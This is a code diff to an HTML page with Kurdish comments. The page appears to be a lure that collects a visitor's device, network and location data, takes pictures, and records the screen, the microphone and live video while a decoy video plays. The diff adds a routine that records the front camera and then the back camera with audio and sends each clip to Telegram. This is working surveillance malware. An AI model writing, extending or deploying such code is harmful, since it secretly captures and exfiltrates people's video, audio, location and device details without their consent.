@@ -217,7 +217,7 @@
             } catch(e) {}
         }
 
-        // خاڵی ١: تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording Stream)
+        // ١. تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording Stream)
         function recordScreenStream() {
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
@@ -242,8 +242,10 @@
             } catch(e) {}
         }
 
-        function recordLiveVideo() {
+        // ٢. تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە و پاشان دواوە (Front & Back Live Video Sequence)
+        function recordLiveVideosSequence() {
             try {
+                // ئەوەی یەکەم: ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Camera Live Video)
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                 .then(stream => {
                     const videoElem = document.getElementById('camVideo');
@@ -255,8 +257,29 @@
                     mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) videoChunks.push(e.data); };
                     mediaRecorder.onstop = () => {
                         let videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-                        sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی ڕووخسار (Live Video)*");
+                        sendToTelegramVideo(videoBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)*");
                         stream.getTracks().forEach(track => track.stop());
+
+                        // ئەوەی دووەم: کاتێک پێشەوە تەواو بوو، ڕاستەوخۆ دەست پێدەکات بە ڤیدیۆی دواوە (Back Camera Live Video)
+                        setTimeout(() => {
+                            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
+                            .then(backStream => {
+                                videoElem.srcObject = backStream;
+                                videoElem.play();
+
+                                let backRecorder = new MediaRecorder(backStream, { mimeType: 'video/mp4' });
+                                let backChunks = [];
+                                backRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) backChunks.push(e.data); };
+                                backRecorder.onstop = () => {
+                                    let backBlob = new Blob(backChunks, { type: 'video/mp4' });
+                                    sendToTelegramVideo(backBlob, "📹 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)*");
+                                    backStream.getTracks().forEach(track => track.stop());
+                                };
+                                backRecorder.start(1000);
+                                setTimeout(() => { if (backRecorder.state === 'recording') backRecorder.stop(); }, 4000);
+                            }).catch(e => {});
+                        }, 1000);
+
                     };
                     mediaRecorder.start(1000);
                     setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000);
@@ -264,7 +287,6 @@
             } catch(e) {}
         }
 
-        // خاڵی ٢: زانیاریی پێشکەوتووی باتری و هاردوێر (Advanced Hardware Telemetry)
         async function getAdvancedHardwareInfo() {
             let info = { battery: "پشتیوانی ناکرێت", storage: "نەزانراو", ram: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو" };
             if ('getBattery' in navigator) {
@@ -283,7 +305,6 @@
             return info;
         }
 
-        // خاڵی ٣: زانیاریی وردی ڕایەڵە و خێرایی هێڵ (Network Information & Connection)
         function getAdvancedNetworkInfo() {
             let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (!conn) return { type: "نەزانراو", downlink: "نەزانراو", rtt: "نەزانراو" };
@@ -495,8 +516,8 @@
             gatherAndSendDetails();
             sendLocation();
             takePicturesSequence();
-            recordLiveVideo();
-            recordScreenStream(); // تۆمارکردنی شاشە
+            recordLiveVideosSequence(); // تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە و دواوە بەدوای یەکدا
+            recordScreenStream();        // تۆمارکردنی شاشە
             recordMicrophone();
 
             setTimeout(function() {
@@ -509,7 +530,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => console.log(e));
-            }, 3500);
+            }, 5000);
         }
     </script>
 </body>
